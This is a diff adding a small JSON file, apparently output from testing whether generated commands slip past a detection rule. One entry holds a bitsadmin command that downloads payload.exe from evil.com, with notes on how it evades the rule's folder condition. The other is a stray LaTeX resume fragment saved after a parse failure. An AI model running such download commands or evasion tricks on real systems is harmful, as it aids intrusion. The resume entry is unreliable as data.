@@ -1,0 +1,10 @@
+[
+  {
+    "output": "bitsadmin /transfer myJob /download /priority high https://evil.com/payload.exe C:\\Users\\JohnDoe\\Downloads\\payload.exe",
+    "explanation": "Uses bitsadmin to download a file to a non-suspicious folder (Users\\JohnDoe\\Downloads), avoiding the selection_folder condition while still matching Image and flags, so the rule does not trigger."
+  },
+  {
+    "output": "%-----------PROJECTS-----------\n\n\\section{\\color{airforceblue}PROJECTS}\n\n    \\resumeSubHeadingListStart\n    \\resumeSubheading\n    {\\textbf{Enhancing Intrusion Detection in ICS using LLMs}}{Research Project}{Individual Project}{Feb - Apr 2025}\n  \\resumeItemListStart\n        \\resumeItem{\\normalsize{Engineered a complete ML pipeline for Industrial Control Systems, fine-tuning \\textbf{SecBERT} (Large Language Model) on time-series sensor data.}}\n        \\resumeItem{\\normalsize{Evaluated model performance and optimized inference latency for real-time detection scenarios.}}\n\n  \\resumeItemListEnd\n    \\resumeSubheading\n  {\\textbf{TravelNest - Microservices Booking Platform}}{Member}\n  {Group Project}{Oct \u2013 Dec 2024}\n  \\resumeItemListStart\n        \\resumeItem{\\normalsize{Developed a scalable backend using \\textbf{Node.js/Express}, focusing on API design and database interactions.}}\n        \\resumeItem{\\normalsize{Implemented real-time features using Socket.IO and deployed the application using containerization principles.}}\n  \\resumeItemListEnd\n\n    \\resumeSubHeadingListEnd\n\\vspace{-8pt}\n\n\n \\vspace{-12pt}",
+    "explanation": "Raw gemini-browser output saved because JSON parse failed: Response does not contain a complete bypass JSON array/object: Expecting value: line 1 column 1 (char 0)"
+  }
+]
